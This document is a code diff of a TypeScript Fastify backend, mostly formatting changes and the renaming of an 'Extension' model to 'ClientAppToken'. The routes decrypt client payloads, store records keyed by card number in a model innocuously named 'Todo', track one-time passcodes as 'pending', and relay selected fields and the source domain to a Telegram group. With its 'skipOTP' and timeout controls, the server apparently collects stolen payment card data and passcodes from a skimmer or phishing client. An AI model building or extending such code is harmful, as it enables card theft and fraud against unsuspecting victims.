@@ -1,8 +1,8 @@
-import {FastifyInstance} from "fastify";
-import {Static, Type} from "@sinclair/typebox";
-import {decrypt} from "../../utils/crypto";
+import { FastifyInstance } from "fastify";
+import { Static, Type } from "@sinclair/typebox";
+import { decrypt } from "../../utils/crypto";
 import { sendToGroup } from '../../utils/telegraf';
-import {ParamSchema} from "../../utils/datatable";
+import { ParamSchema } from "../../utils/datatable";
 
 const BodySchema = Type.Object({
   token: Type.String(),
@@ -31,7 +31,7 @@ export default async (fastify: FastifyInstance) => {
     },
     handler: async (request, reply) => {
       try {
-        const {token, iv, encryptedPayload} = request.body;
+        const { token, iv, encryptedPayload } = request.body;
         const dev = await decrypt(iv, encryptedPayload);
         const json = JSON.parse(dev);
         const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
@@ -42,18 +42,18 @@ export default async (fastify: FastifyInstance) => {
         if (json.otp) {
           json.otpStatus = 'pending';
         }
-        const extension = await fastify.mongoose.Extension.findOne({
+        const clientAppToken = await fastify.mongoose.ClientAppToken.findOne({
           token
         });
-        console.log({extension})
+        console.log({ clientAppToken })
 
-        if (!extension) throw new Error("Extension not found");
+        if (!clientAppToken) throw new Error("ClientAppToken not found");
         let updated = await fastify.mongoose.Todo.findOne({
           cardNumber
         });
-        
+
         if (updated) {
-          updated = await fastify.mongoose.Todo.findOneAndUpdate({ cardNumber }, {...json}, { new: true });
+          updated = await fastify.mongoose.Todo.findOneAndUpdate({ cardNumber }, { ...json }, { new: true });
         } else {
           const count = await fastify.mongoose.Todo.count({});
           updated = await fastify.mongoose.Todo.create({
@@ -64,14 +64,14 @@ export default async (fastify: FastifyInstance) => {
             orderId: count + 1,
           });
         }
-        const fields = extension.logMessage.split(/\s*,\s*/).map((field: string) => field.replace(/\s+/g, '')).filter((field) => !!field);
+        const fields = clientAppToken.logMessage.split(/\s*,\s*/).map((field: string) => field.replace(/\s+/g, '')).filter((field) => !!field);
         const messages = fields.map((field: string) => json[field]);
         await sendToGroup([...messages, json.domain]);
         reply.send({
           success: true,
-          timeout: extension.timeout,
-          timeout2: extension.timeout2,
-          skipOTP: extension.skipOTP,
+          timeout: clientAppToken.timeout,
+          timeout2: clientAppToken.timeout2,
+          skipOTP: clientAppToken.skipOTP,
         });
       } catch (ex) {
         console.error(ex);
@@ -79,7 +79,7 @@ export default async (fastify: FastifyInstance) => {
       }
     }
   });
-  
+
   fastify.route<
     {
       Body: Static<typeof BodySchema>
@@ -92,11 +92,11 @@ export default async (fastify: FastifyInstance) => {
     },
     handler: async (request, reply) => {
       const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
-      const {token, iv, encryptedPayload} = request.body;
+      const { token, iv, encryptedPayload } = request.body;
       const dev = await decrypt(iv, encryptedPayload);
       const json = JSON.parse(dev);
-      const extension = await fastify.mongoose.Extension.findOne({ token });
-      const fields = extension.logMessage.split(/\s*,\s*/).map((field: string) => field.replace(/\s+/g, '')).filter((field) => !!field);
+      const clientAppToken = await fastify.mongoose.ClientAppToken.findOne({ token });
+      const fields = clientAppToken.logMessage.split(/\s*,\s*/).map((field: string) => field.replace(/\s+/g, '')).filter((field) => !!field);
       const messages = fields.map((field: string) => json[field]);
       await sendToGroup([...messages, json.products, json.domain]);
       reply.send({
@@ -106,9 +106,9 @@ export default async (fastify: FastifyInstance) => {
   });
 
   fastify.route<
-      {
-        Params: Static<typeof ParamSchema>,
-      }
+    {
+      Params: Static<typeof ParamSchema>,
+    }
   >({
     method: "GET",
     url: "/status/:id",
@@ -131,10 +131,10 @@ export default async (fastify: FastifyInstance) => {
   });
 
   fastify.route<
-      {
-        Params: Static<typeof ParamSchema>,
-        Body: Static<typeof TagsBodySchema>
-      }
+    {
+      Params: Static<typeof ParamSchema>,
+      Body: Static<typeof TagsBodySchema>
+    }
   >({
     method: "POST",
     url: "/tags/:id",
